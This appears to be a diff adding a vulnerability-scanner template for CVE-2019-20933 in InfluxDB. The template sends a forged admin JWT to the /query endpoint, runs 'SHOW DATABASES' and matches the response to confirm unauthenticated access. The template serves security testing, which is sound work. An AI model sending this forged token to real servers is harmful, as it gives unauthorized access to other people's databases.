@@ -1,0 +1,19 @@
+id: inflxdb-unauth-access
+
+info:
+    name: InflxDB Unauthorized Access
+    author: Yuuki
+    severity: medium
+    tags: unauth, influxdb, cve, cve-2019-20933
+
+http:
+    - method: GET
+      path:
+          - "{{Hostname}}/query"
+      headers:
+          Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s"
+      body: "q=SHOW DATABASES"
+      matchers:
+          - type: word
+            words:
+                - '"statement_id":0'
